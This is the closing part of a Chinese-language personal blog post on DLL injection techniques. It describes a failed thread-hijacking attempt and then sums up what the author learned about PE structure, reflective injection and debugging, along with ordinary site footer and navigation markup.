<p><img class=lazyload src=/svg/loading.min.svg data-src=%e7%ac%ac%e4%ba%8c%e6%ac%a1%e4%bf%ae%e6%94%b9shellcode%e5%bc%82%e5%b8%b8.png data-srcset="/dllinjection/%E7%AC%AC%E4%BA%8C%E6%AC%A1%E4%BF%AE%E6%94%B9shellcode%E5%BC%82%E5%B8%B8.png, %e7%ac%ac%e4%ba%8c%e6%ac%a1%e4%bf%ae%e6%94%b9shellcode%e5%bc%82%e5%b8%b8.png 1.5x, /dllinjection/%E7%AC%AC%E4%BA%8C%E6%AC%A1%E4%BF%AE%E6%94%B9shellcode%E5%BC%82%E5%B8%B8.png 2x" data-sizes=auto alt=/dllinjection/%E7%AC%AC%E4%BA%8C%E6%AC%A1%E4%BF%AE%E6%94%B9shellcode%E5%BC%82%E5%B8%B8.png title=第二次修改shellcode异常></p>
<p>我之前也写过把返回地址不存入寄存器，而是存入栈里，依然会出现一样的问题。</p>
<p>并且前面通过r15保存返回地址，在调试环境下却能成功注入，而脱离调试环境却不能成功还会造成程序闪退。我唯一能想到的原因就是因为存入的返回地址导致原程序需要的数据被修改或丢失。但是我没办法证明这个推测的正确性。</p>
<p>因此该方法只能以失败告终。</p>
<h4 id=0x8-总结>0x8 总结</h4>
<p>不管是在Linux、安卓或是其他非主流操作系统，一个进程的运行离不开各种库，因此其核心思想都是相同的，无非是通过操作系统的各种机制将动态链接库或者静态库注入到目标进程，从而获取目标进程的控制权。这些技术都是好几年前的老技术了，现在很多检测与防御技术都可以轻松破解这些攻击手段。虽然技术老了，但是能学到的东西依然很多，技术本身很简单，但是亲自动手写代码，调试BUG，并在解决BUG的途中收获更多知识，才是学习的核心。反射式DLL注入是我收获最大的一项技术，这种技术需要对PE结构有非常详细的了解才能实现，这就促使我再次强化了PE文件的学习，并且还通过该方法掌握了重定位表的作用，线程劫持技术虽然没能实现成功，但是双调试器联调的经历也是非常宝贵的调试经验，个人的调试与分析汇编能力也得到了进步提高。在静态DLL注入中，也通过自己调试发现C++编译后的函数名会发生变化而导致的函数调用失败。该项目会在后续有时间的时候不断完善更新，因为DLL注入技术还有非常多值得学习的。学海无涯，下次博客再见。</p>
</div><div class=post-footer id=post-footer>
<div class=post-info>
<div class=post-info-line>
<div class=post-info-mod>
<span>更新于 2022-03-24</span>
</div>
<div class=post-info-license></div>
</div>
<div class=post-info-line>
<div class=post-info-md><span>
<a class=link-to-markdown href=/dllinjection/index.md target=_blank>阅读原始文档</a>
</span></div>
<div class=post-info-share>
<span></span>
</div>
</div>
</div>
<div class=post-info-more>
<section class=post-tags><i class="fas fa-tags fa-fw"></i>&nbsp;<a href=/tags/%E9%80%86%E5%90%91/>逆向</a></section>
<section>
<span><a href=javascript:void(0); onclick=window.history.back()>返回</a></span>&nbsp;|&nbsp;<span><a href=/>主页</a></span>
</section>
</div>
<div class=post-nav><a href=/010editorcracker/ class=prev rel=prev title="010editor 最新V12版本逆向算法以及暴力破解"><i class="fas fa-angle-left fa-fw"></i>010editor 最新V12版本逆向算法以及暴力破解</a>
<a href=/hooktechnique/ class=next rel=next title=常用Hook技术解析>常用Hook技术解析<i class="fas fa-angle-right fa-fw"></i></a></div>
</div>
<div id=comments>
<div class="container giscus">
<script src=https://giscus.app/client.js data-repo=Mrsdwang/Mrsdwang.github.io data-repo-id=R_kgDOGnLCKA data-category=Announcements data-category-id=DIC_kwDOGnLCKM4CW8wp data-mapping=pathname data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=top data-theme=light data-lang=zh-CN data-loading=lazy crossorigin=anonymous async></script>
</div>
</div></article></div>
</main><footer class=footer>
<div class=footer-container><div class=footer-line><i class="far fa-copyright fa-fw"></i><span itemprop=copyrightYear>2021 - 2023</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank>ShiDong</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div>
</div>
</footer>
</div>
<div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title=回到顶部>
<i class="fas fa-arrow-up fa-fw"></i>
</a><a href=# id=view-comments class=fixed-button title=查看评论>
<i class="fas fa-comment fa-fw"></i>
</a>
</div><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/contrib/copy-tex.min.css><script type=text/javascript src=https://cdn.jsdelivr.net/npm/smooth-scroll@16.1.3/dist/smooth-scroll.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lazysizes@5.2.2/lazysizes.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/contrib/auto-render.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/contrib/copy-tex.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/contrib/mhchem.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"复制到剪贴板",maxShownLines:10},comment:{},math:{delimiters:[{display:!0,left:"$$",right:"$$"},{display:!0,left:"\\[",right:"\\]"},{display:!1,left:"$",right:"$"},{display:!1,left:"\\(",right:"\\)"}],strict:!1}}</script><script type=text/javascript src=/js/theme.min.js></script></body>
</html>